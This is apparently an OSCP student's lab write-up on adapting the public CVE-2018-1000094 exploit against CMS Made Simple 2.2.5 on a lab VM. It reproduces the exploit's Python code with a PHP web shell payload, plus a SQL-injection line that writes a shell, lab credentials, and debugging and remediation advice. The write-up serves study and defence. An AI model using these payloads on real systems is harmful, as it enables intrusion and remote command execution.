# CMS Made Simple 2.2.5 - CVE-2018-1000094 Authenticated RCE Exploit Adaptation

## 🎯 Learning Objectives
- Adapt authenticated RCE exploits for HTTPS targets
- Understand post-authentication exploitation workflow
- Modify Python exploit variables for target environment
- Debug exploit errors using stack traces
- Practice CSRF token handling in web exploits
- Document exploit adaptation failures for learning

---

## 📋 Target Information

| Parameter | Value |
|-----------|-------|
| **Target IP** | 192.168.165.45 (Debian VM) |
| **Protocol** | HTTPS (self-signed certificate) |
| **CMS** | CMS Made Simple 2.2.5 |
| **Vulnerability** | CVE-2018-1000094 - Authenticated RCE |
| **Exploit** | ExploitDB 44976 |
| **Authentication Required** | ✅ YES |
| **Credentials** | admin / HUYfaw763 (found during enumeration) |
| **Attack Vector** | File upload → Copy to PHP → RCE |

---

## 🔐 Prerequisites: Credentials Discovery

**Context**: During the enumeration process on another machine, valid application credentials were discovered:

```
Username: admin
Password: HUYfaw763
```

**Key Insight**: This is a **post-authentication** vulnerability, meaning we MUST have valid credentials before exploitation.

---

## 🔍 Vulnerability Overview: CVE-2018-1000094

### **Vulnerability Type**
Authenticated Remote Code Execution via File Manager module

### **Attack Chain**
1. **Authenticate** to CMS admin panel using credentials
2. **Upload** malicious `.txt` file containing PHP code
3. **Copy** `.txt` file to `.php` extension via File Manager
4. **Execute** uploaded PHP web shell via HTTP request

### **Why This Works**
- CMS allows uploading `.txt` files (bypasses upload restrictions)
- File Manager allows copying/renaming files
- Copied `.php` file is placed in web-accessible directory
- No input sanitization on copied file content

---

## 📥 Phase 1: Exploit Acquisition & Analysis

### **Download Original Exploit**
```bash
searchsploit "cms made simple 2.2.5 authenticated"
searchsploit -m 44976  # Download exploit
```

**Exploit Details:**
- **EDB-ID**: 44976
- **CVE**: CVE-2018-1000094
- **Type**: Authenticated RCE
- **Language**: Python 2
- **Requirements**: Valid admin credentials

### **Original Exploit Code Structure**

```python
#!/usr/bin/python
import requests
import base64

# TARGET CONFIGURATION (Lines 13-16)
base_url = "http://192.168.1.10/cmsms/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin')[0] + upload_dir
username = "admin"
password = "password"

# CSRF & FILE CONFIGURATION (Lines 18-22)
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

# FUNCTION 1: Parse CSRF Token (Lines 24-25)
def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]

# FUNCTION 2: Authenticate (Lines 27-40)
def authenticate():
    page = "/login.php"  # ← Variable holding login page name
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    response = requests.post(url, data=data, allow_redirects=False)
    status_code = response.status_code
    if status_code == 302:
        print "[+] Authenticated successfully"
        return response.cookies, parse_csrf_token(response.headers['Location'])
    print "[-] Authentication failed"
    return None, None

# FUNCTION 3: Upload TXT File (Lines 42-58)
def upload_txt(cookies, csrf_token):
    # Uploads malicious .txt file to /uploads/

# FUNCTION 4: Copy to PHP (Lines 60-84)
def copy_to_php(cookies, csrf_token):
    # Copies .txt to .php for code execution

# FUNCTION 5: Main Execution (Lines 92-100)
def run():
    cookies, csrf_token = authenticate()
    if not cookies:
        quit()
    if not upload_txt(cookies, csrf_token):
        quit()
    if not copy_to_php(cookies, csrf_token):
        quit()
    print "[+] Shell at: {}".format(upload_url + '/' + php_filename)
```

---

## 🔧 Phase 2: Required Exploit Adaptations

### **Adaptation 1: Base URL for HTTPS**

**Original:**
```python
base_url = "http://192.168.1.10/cmsms/admin"
```

**Modified for our target:**
```python
base_url = "https://192.168.165.45/admin"
```

**Changes:**
- `http://` → `https://` (HTTPS protocol)
- `192.168.1.10` → `192.168.165.45` (our target IP)
- Removed `/cmsms` (not in our directory structure)

---

### **Adaptation 2: Credentials Update**

**Original:**
```python
username = "admin"
password = "password"
```

**Modified with discovered credentials:**
```python
username = "admin"
password = "HUYfaw763"
```

**Why These Variables:**
- `username` (line ~15): Stores login username
- `password` (line ~16): Stores login password
- Used in `authenticate()` function to log into admin panel

---

### **Adaptation 3: SSL Certificate Verification**

**Problem**: Self-signed certificate causes `SEC_ERROR_UNKNOWN_ISSUER`

**Original POST requests (lines 34, 55, 80):**
```python
response = requests.post(url, data=data, allow_redirects=False)
response = requests.post(url, data=data, files=txt, cookies=cookies)
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
```

**Modified with SSL bypass:**
```python
response = requests.post(url, data=data, allow_redirects=False, verify=False)
response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
```

**Added Parameter:**
- `verify=False`: Ignore SSL certificate validation
- Required for self-signed certificates in lab environments

---

### **Adaptation 4: Suppress SSL Warnings (Optional)**

**Add at top of script:**
```python
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```

**Reason**: Prevents console spam from SSL warnings

---

## 📝 Summary of Variables Modified

### **Question: Which variable holds the name of PHP page (login.php) responsible for authentication?**

**Answer: The `page` variable** (inside `authenticate()` function)

```python
def authenticate():
    page = "/login.php"  # ← THIS VARIABLE
    url = base_url + page  # Concatenated to form full URL
```

**Full URL constructed:**
```
base_url + page = "https://192.168.165.45/admin" + "/login.php"
                = "https://192.168.165.45/admin/login.php"
```

### **All Variables That Required Modification**

| Variable | Location | Original | Modified | Purpose |
|----------|----------|----------|----------|---------|
| **`base_url`** | Line ~13 | `http://192.168.1.10/cmsms/admin` | `https://192.168.165.45/admin` | Target URL |
| **`username`** | Line ~15 | `"admin"` | `"admin"` | Login username |
| **`password`** | Line ~16 | `"password"` | `"HUYfaw763"` | Login password |
| **`page`** | Inside `authenticate()` | `"/login.php"` | (No change needed) | Login page path |
| **`verify`** | Lines 34, 55, 80 | (Not present) | `verify=False` | SSL bypass |

---

## 🔴 Phase 3: Execution & Error Analysis

### **Running the Modified Exploit**
```bash
python2 44976_modified.py
```

### **Error Encountered**

```
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning: Unverified HTTPS request is being made.
[+] Authenticated successfully with the supplied credentials
Traceback (most recent call last):
  File "44976_modified.py", line 103, in <module>
    run()
  File "44976_modified.py", line 94, in run
    cookies,csrf_token = authenticate()
  File "44976_modified.py", line 38, in authenticate
    return response.cookies, parse_csrf_token(response.headers['Location'])
  File "44976_modified.py", line 24, in parse_csrf_token
    return location.split(csrf_param + "=")[1]
IndexError: list index out of range
```

---

## 🐛 Error Analysis: IndexError in parse_csrf_token

### **Question: Which array position is trying to access the split method?**

**Answer: Array position `[1]`** (index 1, the second element)

### **The Problematic Code (Line 24)**

```python
def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]
    #                                      ^^^
    #                              Accessing array position [1]
```

### **Understanding the Error**

**How `split()` works:**
```python
csrf_param = "__c"

# Expected scenario (CSRF token present):
location = "https://192.168.165.45/admin/index.php?__c=abc123def456"
result = location.split("__c=")
# Returns: ['https://192.168.165.45/admin/index.php?', 'abc123def456']
#           [0]                                        [1]
# Accessing [1] works → Returns 'abc123def456'

# Actual scenario (NO CSRF token):
location = "https://192.168.165.45/admin/index.php"
result = location.split("__c=")
# Returns: ['https://192.168.165.45/admin/index.php']
#           [0]
# Accessing [1] fails → IndexError: list index out of range
```

### **Why the Error Occurs**

1. **Authentication succeeded** (message: "Authenticated successfully")
2. **302 redirect received** (status code check passed)
3. **Location header examined**: `response.headers['Location']`
4. **CSRF parameter missing**: Location header doesn't contain `__c=`
5. **Split returns single element**: Only `[0]` exists
6. **Accessing `[1]` fails**: No second element in array

### **Root Cause**

The `Location` header in the 302 redirect response does not contain the expected `__c=` CSRF token parameter, likely because:
- CMS version/configuration difference
- Different authentication flow
- CSRF token passed via different method (cookie, POST data)
- Exploit assumes specific CMS configuration

---

## 🔍 Phase 4: Debugging Strategy

### **Method 1: Print Debug Information**

**Add debugging to parse_csrf_token:**
```python
def parse_csrf_token(location):
    print("[DEBUG] Location header: {}".format(location))
    print("[DEBUG] Split result: {}".format(location.split(csrf_param + "=")))
    print("[DEBUG] csrf_param: {}".format(csrf_param))
    return location.split(csrf_param + "=")[1]
```

**Expected output:**
```
[DEBUG] Location header: https://192.168.165.45/admin/index.php
[DEBUG] Split result: ['https://192.168.165.45/admin/index.php']
[DEBUG] csrf_param: __c
```

### **Method 2: Examine Full Response Headers**

```python
def authenticate():
    # ... existing code ...
    if status_code == 302:
        print("[+] Authenticated successfully")
        print("[DEBUG] All headers:")
        for header, value in response.headers.items():
            print("  {}: {}".format(header, value))
        # ... rest of code ...
```

### **Method 3: Check Cookies for CSRF Token**

```python
def authenticate():
    # ... existing code ...
    if status_code == 302:
        print("[+] Authenticated successfully")
        print("[DEBUG] Cookies:")
        for cookie in response.cookies:
            print("  {}: {}".format(cookie.name, cookie.value))
        # ... rest of code ...
```

---

## 🛠️ Phase 5: Potential Fixes

### **Fix 1: Error Handling for Missing CSRF Token**

```python
def parse_csrf_token(location):
    parts = location.split(csrf_param + "=")
    if len(parts) < 2:
        print("[!] Warning: CSRF token not found in Location header")
        print("[!] Location: {}".format(location))
        return None  # or return empty string
    return parts[1]
```

### **Fix 2: Extract CSRF from Cookies**

```python
def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    response = requests.post(url, data=data, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302:
        print("[+] Authenticated successfully")

        # Try Location header first
        if csrf_param + "=" in response.headers.get('Location', ''):
            csrf_token = parse_csrf_token(response.headers['Location'])
        # Try cookies as fallback
        elif csrf_param in response.cookies:
            csrf_token = response.cookies[csrf_param]
        else:
            print("[!] CSRF token not found")
            csrf_token = None

        return response.cookies, csrf_token
    print("[-] Authentication failed")
    return None, None
```

### **Fix 3: Follow Redirect to Get CSRF Token**

```python
def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    # Allow redirect to follow to dashboard
    response = requests.post(url, data=data, allow_redirects=True, verify=False)

    # Extract CSRF from final page HTML
    if "admin" in response.url:
        print("[+] Authenticated successfully")
        # Parse CSRF from page content
        import re
        csrf_match = re.search(r'__c=([a-f0-9]+)', response.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)
        else:
            csrf_token = None
        return response.cookies, csrf_token

    print("[-] Authentication failed")
    return None, None
```

---

## 📊 Comparison: CVE-2019-9053 vs CVE-2018-1000094

| Aspect | CVE-2019-9053 (SQLi) | CVE-2018-1000094 (RCE) |
|--------|---------------------|------------------------|
| **Authentication** | ❌ Not required | ✅ Required |
| **Attack Vector** | News module SQLi | File Manager upload |
| **Technique** | Blind time-based SQLi | File upload + rename |
| **Result** | Credential extraction | Direct RCE |
| **Complexity** | Medium (blind enumeration) | Low (if authenticated) |
| **OSCP Relevance** | High (credential discovery) | High (post-auth RCE) |
| **Success in Lab** | ✅ Worked | ⚠️ Needs debugging |

---

## 🎓 Educational Insights

### **Key Learning Points**

1. **Post-authentication exploits require valid credentials**
   - Always enumerate thoroughly for credentials
   - Check default creds, config files, other machines

2. **Public exploits may need adaptation**
   - Environment differences (paths, configurations)
   - Version differences (CSRF handling changes)
   - Protocol differences (HTTP vs HTTPS)

3. **Error messages are educational**
   - Stack traces show exact failure points
   - Array index errors indicate missing data
   - Debug systematically before giving up

4. **Multiple exploitation paths exist**
   - If authenticated RCE fails, try other vectors
   - SQLi from CVE-2019-9053 already gave us credentials
   - Could try manual file upload via admin panel

### **Troubleshooting Methodology**

```
1. Read error message carefully
   └─> Identify exact line and function

2. Understand what code expects
   └─> CSRF token in Location header

3. Determine what actually happens
   └─> Location header missing CSRF token

4. Add debug output
   └─> Print headers, cookies, responses

5. Research alternatives
   └─> CSRF in cookies? In page HTML? Different parameter?

6. Implement fix
   └─> Error handling, alternative extraction

7. Test incrementally
   └─> Verify each change works

8. Document findings
   └─> Help future exploitation attempts
```

---

## 🔄 Alternative Exploitation Paths

### **Path 1: Manual Admin Panel Upload**
Since we have valid credentials (`admin / HUYfaw763`):

```bash
# 1. Log into admin panel manually
firefox https://192.168.165.45/admin/

# 2. Navigate to File Manager module
Extensions → File Manager

# 3. Upload PHP web shell directly
<?php system($_GET['cmd']); ?>

# 4. Access shell
https://192.168.165.45/uploads/shell.php?cmd=whoami
```

### **Path 2: Continue Using CVE-2019-9053 SQLi**
The unauthenticated SQLi already extracted credentials:

```bash
# Use SQLi to write web shell directly
?m1_idlist=1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/https/shell.php'--
```

### **Path 3: Other Authenticated Exploits**
Search for additional vulnerabilities:

```bash
searchsploit "cms made simple authenticated"
# Check for:
# - Template editing (inject PHP in templates)
# - Module installation (malicious module upload)
# - User creation (create backdoor admin account)
```

---

## 🛡️ Defense & Remediation

### **How to Prevent CVE-2018-1000094**

**1. Update CMS Made Simple**
```bash
# Upgrade to patched version
# CVE-2018-1000094 is fixed in version 2.2.6+
```

**2. File Upload Restrictions**
```php
// Whitelist allowed extensions
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array(strtolower($ext), $allowed)) {
    die("File type not allowed");
}

// Validate MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die("Invalid file type");
}
```

**3. Disable PHP Execution in Upload Directory**
```apache
# .htaccess in /uploads/
<FilesMatch "\.php$">
    Require all denied
</FilesMatch>
```

**4. Strong CSRF Protection**
```php
// Generate strong CSRF tokens
$csrf_token = bin2hex(random_bytes(32));

// Validate on every state-changing request
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF token validation failed");
}
```

**5. Admin Panel IP Whitelisting**
```apache
<Directory "/var/www/https/admin">
    Require ip 192.168.1.0/24
    Require ip 10.0.0.0/8
</Directory>
```

---

## 📝 Key Takeaways

### **Technical Skills**
✅ Identified variables requiring modification (`base_url`, `username`, `password`)
✅ Added SSL verification bypass (`verify=False`)
✅ Understood CSRF token extraction mechanism
✅ Debugged IndexError using stack trace analysis
✅ Identified array position `[1]` as failure point
✅ Proposed multiple fix strategies

### **OSCP Methodology**
✅ Used credentials from previous enumeration (CVE-2019-9053)
✅ Adapted public exploit for target environment
✅ Analyzed errors systematically
✅ Documented failure for learning
✅ Identified alternative exploitation paths
✅ Maintained multiple attack vectors simultaneously

### **Debugging Checklist**
- [ ] Read full error message and stack trace
- [ ] Identify exact line number and function
- [ ] Understand what code expects vs. what it gets
- [ ] Add debug print statements
- [ ] Examine all HTTP headers and cookies
- [ ] Research CMS version differences
- [ ] Implement error handling
- [ ] Test alternative extraction methods
- [ ] Document findings for future attempts
- [ ] Consider alternative exploitation paths

---

## 🔗 References

- **CVE-2018-1000094**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000094
- **ExploitDB 44976**: https://www.exploit-db.com/exploits/44976
- **CMS Made Simple Security Advisories**: https://www.cmsmadesimple.org/downloads/cmsms/security-announcements/
- **Python Requests SSL Verification**: https://requests.readthedocs.io/en/latest/user/advanced/#ssl-cert-verification
- **CSRF Token Best Practices**: https://owasp.org/www-community/attacks/csrf

---

## 📄 Current Status

**Exploit Adaptation**: ✅ Complete (base_url, credentials, SSL bypass)
**Execution**: ⚠️ Failed (CSRF token extraction error)
**Error Identified**: IndexError at array position [1] in `parse_csrf_token()`
**Root Cause**: Location header missing `__c=` parameter
**Next Steps**: Debug CSRF token location, implement alternative extraction

---

## 🎯 Next Actions for Continuation

1. **Add debug output** to see actual Location header value
2. **Check cookies** for CSRF token as alternative
3. **Examine HTML** of post-login page for CSRF token
4. **Try manual upload** via admin panel as immediate RCE path
5. **Research CMS 2.2.5 CSRF behavior** for version-specific handling
6. **Test alternative authenticated exploits** if CSRF extraction fails
7. **Document successful path** once RCE achieved

---

**Documented by**: OSCP Student
**Date**: 2025-10-06
**Lab**: CMS Made Simple 2.2.5 Exploit Adaptation
**Status**: Exploit adapted, debugging in progress
**Learning Value**: ⭐⭐⭐⭐⭐ (High - demonstrates real-world exploit adaptation challenges)
